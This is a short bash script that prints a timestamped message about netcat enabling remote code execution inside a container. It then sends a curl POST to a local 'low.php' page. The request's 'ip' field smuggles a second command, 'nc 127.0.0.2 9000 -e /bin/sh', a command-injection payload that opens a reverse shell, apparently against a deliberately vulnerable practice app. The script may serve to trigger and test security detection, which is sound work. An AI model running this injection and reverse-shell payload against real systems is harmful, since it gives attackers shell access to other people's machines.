#!/bin/bash

echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92mNetcat Program runs inside container that allows remote code execution\033[m"
curl -X POST -d "ip=1.1.1.1;nc%20127.0.0.2%209000%20-e%20/bin/sh&Submit=Submit" http://localhost/low.php  >/dev/null 2>&1
